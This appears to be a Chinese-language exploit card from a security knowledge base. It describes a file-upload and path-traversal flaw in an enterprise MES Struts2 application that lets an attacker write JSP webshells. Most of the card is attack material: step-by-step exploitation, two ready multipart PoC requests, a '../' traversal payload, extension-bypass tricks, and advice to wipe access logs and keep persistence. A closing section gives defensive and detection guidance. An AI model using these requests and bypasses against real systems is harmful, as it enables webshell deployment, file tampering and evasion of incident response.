---
id: web-generic-file-upload-mes-uploadfilename-arbitrary-jsp
title: MES 上传接口信任 uploadFileName：任意后缀 + 目录穿越写入 JSP（uploadImages/uploadFile）
type: scenario
domain: web
path: web/generic/file-upload
technique: mes-struts2-uploadfilename-arbitrary-write
aliases:
- MES 任意文件上传
- uploadImages.action 上传
- uploadFile.action 上传
- uploadFileName 目录穿越
- Struts2 上传文件名覆盖
tags:
- java
- struts2
- file-upload
- path-traversal
- webshell
- mes
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V35
  verified_at: '2026-11-05T06:02:23+08:00'
  notes: 已对照原文核对：uploadImages/uploadFile 用 uploadUrl + uploadFileName 拼 localFile 后 FileUtils.copyFile，无后缀/路径校验，uploadFileName 可控；原文未实际访问上传后的 JSP（需目标容器解析），成功写文件可确认。
---

## 一句话结论

某企业 MES 的图片/文件上传 Action 直接使用 Struts2 封装的 `uploadFileName` 与配置的上传目录拼接成 `localFile`，随后 `FileUtils.copyFile(this.upload, localFile)`；既没有后缀/内容校验，也没有对 `uploadFileName` 做路径归一化，攻击者可上传 `.jsp` 并用 `../` 穿越到 Web 根或其他可写目录，形成 WebShell 或覆盖任意文件。

## 原理

- **第一处：`TbSysImagesAction.upload()`**：
  ```java
  File localFile = new File(uploadUrl + "/" + this.uploadFileName);
  if (!StringUtil.isEmpty(uploadUrl)) {
      FileUtils.copyFile((File)this.upload, (File)localFile);
  }
  ```
  `uploadUrl` 来自配置 `location_images_upload_url`，`this.uploadFileName` 由 Struts2 从 multipart 的文件名/`uploadFileName` 参数注入；代码只检查 `uploadUrl` 非空，不检查后缀、不检查目标路径是否仍在图片目录。
- **第二处：`TbSysFileAction.upload()`**：同样 `new File(uploadUrl + "/" + this.uploadFileName)` + `copyFile`，配置项为 `location_file_upload_url`。
- **Struts2 文件上传模型**：Action 的 `upload`（`File`）、`uploadFileName`（原始文件名）、`uploadContentType` 由 Struts2 的 `FileUploadInterceptor` 自动填充，同时请求参数也可直接覆盖同名 setter；因此攻击者既能控制文件内容，也能控制保存文件名。
- **为什么能 getshell**：上传目录在配置中常位于 Web 根下（或可通过 `../` 穿越到 Web 根、`webapps/ROOT`、`WEB-INF` 外的可解析目录）；`.jsp`/`.jspx` 等后缀未被拦截，写入后可直接访问执行。目录穿越还可覆盖已有文件（配置、其他 JSP），造成篡改或拒绝服务。
- **鉴权**：`*Images`/`*File` 是 Struts2 action，可能被 `AuthorityInterceptor` 保护；原文 PoC 带 `JSESSIONID`，实际利用需要有效会话（或目标存在白名单/未套拦截器的 action）。
- **与上传逻辑相关的二次注入**：`upload()` 后续还拼接 `helperService.updateSQL(hql)`（`filePath`/`fileSize`），若文件名进入 SQL，可能形成二次注入；本卡聚焦文件写入。

## 触发条件

- 目标为使用该 MES 代码库的应用，存在 `TbSysImagesAction.upload()`/`TbSysFileAction.upload()` 及对应路由。
- 上传目录可写，且位于 Web 根下或可通过 `../` 到达可解析目录；应用容器会解析上传的脚本后缀。
- 攻击者能访问 `/cmt/uploadImages.action` 或 `/cmt/uploadFile.action`，并具备有效会话（若被鉴权拦截器保护）。
- 目标未对上传后缀、内容类型、文件名做白名单/归一化，未把上传目录配置为禁止脚本执行。

## 利用步骤

1. 登录/获取有效会话，访问上传页面或直接构造 multipart 请求。
2. 以 `upload` 字段上传 JSP 内容，文件名的原始名设为 `test.jsp`；如 Action 使用单独的 `uploadFileName` setter，同时在表单中提交 `uploadFileName=test.jsp`。
3. 若要穿越到 Web 根，设置 `uploadFileName=../../webapps/ROOT/test.jsp`（按目标目录结构调整层级）；Windows 用 `..\..\`。
4. 上传成功后访问对应 URL（如 `/test.jsp`）验证执行；若上传目录不能直接访问，先用文件读取接口确认落盘路径，再寻找可解析目录。
5. 清理上传文件与访问日志，评估是否需要进一步权限维持。

## PoC

```http
POST /cmt/uploadImages.action HTTP/1.1
Host: target
Cookie: JSESSIONID=<valid session>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 122

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="upload"; filename="test.jsp"
Content-Type: image/jpeg

<% 123 %>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="uploadFileName"

test.jsp
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

```http
POST /cmt/uploadFile.action HTTP/1.1
Host: target
Cookie: JSESSIONID=<valid session>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 122

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="upload"; filename="test.jsp"
Content-Type: image/jpeg

<% 123 %>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="uploadFileName"

test.jsp
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

目录穿越变体（按目标路径调整）：

```text
uploadFileName=../../webapps/ROOT/test.jsp
```

## 变体与关联

- **上传字段名**：不同 Action 的 `File` 字段名可能是 `upload`/`file`，`uploadFileName` 也可能由原始文件名自动填充；以目标 Action 的 setter 为准。
- **后缀绕过**：若目标只拦 `.jsp`，可尝试 `.jspx`、`.jspf`、大小写、双写、`;` 参数、`%00`（旧容器）等；本代码本身未见后缀检查。
- **目录穿越**：`uploadUrl + "/" + uploadFileName` 未归一化，`../` 可逃逸上传目录；Windows 同时接受 `\` 与 `/`。
- **组合利用**：与文件读取接口配合确认落盘路径；与 SQL 注入接口配合读取配置/凭据。
- 关联卡片：[[web-generic-file-inclusion-mes-download-filename-path]]、[[web-generic-sqli-mes-hql-append-find-actions]]。

## 检测与防御

- **代码**：上传文件必须使用服务端生成的文件名（UUID/哈希）+ 白名单后缀；`uploadFileName` 只用于展示，不参与路径拼接；`Path.normalize()` 后校验目标仍在指定目录；禁止上传目录解析脚本。
- **部署**：上传目录放在 Web 根之外，通过下载接口鉴权读取；容器对上传目录关闭 JSP 解析；限制目录写权限。
- **检测**：上传请求中 `uploadFileName` 含 `../`、`..\`、`.jsp`、`.jspx`、双扩展名；上传目录出现新增脚本/异常文件；Web 访问日志中出现刚上传文件的执行请求；文件写入时间与上传请求对应。
- **应急**：删除恶意文件、隔离上传目录、审计同时间段的其他上传与访问；轮换可能被读取的配置凭据；修复后回归正常图片/附件上传。
